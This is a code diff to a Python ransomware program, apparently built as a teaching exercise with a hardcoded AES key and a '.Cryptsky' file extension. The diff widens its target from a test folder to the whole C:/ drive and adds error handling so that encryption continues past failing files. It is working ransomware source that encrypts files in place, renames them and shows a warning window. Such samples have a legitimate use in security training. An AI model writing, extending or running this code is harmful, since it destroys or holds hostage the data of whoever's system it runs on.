@@ -1,4 +1,5 @@
 #!/usr/bin/env python
+import shlex
 from pathlib import Path
 
 from Cryptodome.Cipher import AES
@@ -17,7 +18,7 @@ import time
 # hardcoded key to make easier for students to decrypt
 HARDCODED_KEY = 'yellow submarine'
 # Can change to C:/ later to encrypt drive, but this is for testing
-START_DIR = [r'C:/CryptMe']
+START_DIR = ['C:/']
 # Path of evidence file dropped to disk
 PATH = Path(r'C:/Windows/Temp/winUpdater.log')
 
@@ -38,7 +39,7 @@ class WindowThread(threading.Thread):
                               text="Do not close this program or turn off the VM "
                                    "until this window says it is safe to do so... "
                                    "\nor face (some) permanent damage.\n You have been warned\n"
-                                   "In the meantime, feel free to look for the key.. "
+                                   "When encryption is complete, look for the key. "
                                    "It's hidden somewhere on this system"
                                 , font=('Helvetica', 20))
         warning.pack()
@@ -63,6 +64,9 @@ class WindowThread(threading.Thread):
 
 def decrypt(key):
     if check_key(key):
+        l= tkinter.Label(root, text="This is the correct key. \n"
+                                         "Your files are being decrypted but it may take a while. Please wait...")
+        l.pack()
         ctr = Counter.new(128)
         crypt = AES.new(key.encode(), AES.MODE_CTR, counter=ctr)
         startdirs = START_DIR
@@ -70,8 +74,11 @@ def decrypt(key):
             for file in discover.discoverFiles(currentDir):
                 (name, ext) = os.path.splitext(file)
                 if ext in '.Cryptsky':
-                    modify.modify_file_inplace(file, crypt.encrypt)
-                    os.rename(file, name)
+                    try:
+                        modify.modify_file_inplace(file, crypt.encrypt)
+                        os.rename(file, name)
+                    except IOError:
+                        print("Error")
         try:
             print()
             os.remove(r'C:\Windows\Temp\winUpdater.log')
@@ -86,9 +93,6 @@ def decrypt(key):
 def check_key(key):
     if key == HARDCODED_KEY:
         print("Key Match")
-        label = tkinter.Label(root, text="This is the correct key. \n"
-                                         "Your files are being decrypted but it may take a while. Please wait...")
-        label.pack()
         return True
     else:
         print("Key no match")
@@ -121,8 +125,11 @@ def main():
         # encrypt files
         for currentDir in startdirs:
             for file in discover.discoverFiles(currentDir):
-                modify.modify_file_inplace(file, crypt.encrypt)
-                os.rename(file, file+'.Cryptsky') # append filename to indicate crypted
+                try:
+                    modify.modify_file_inplace(file, crypt.encrypt)
+                    os.rename(file, file+'.Cryptsky') # append filename to indicate crypted
+                except IOError:
+                    print("Error")
 
         # write evidence file to disk
         file = open(PATH, 'w+')
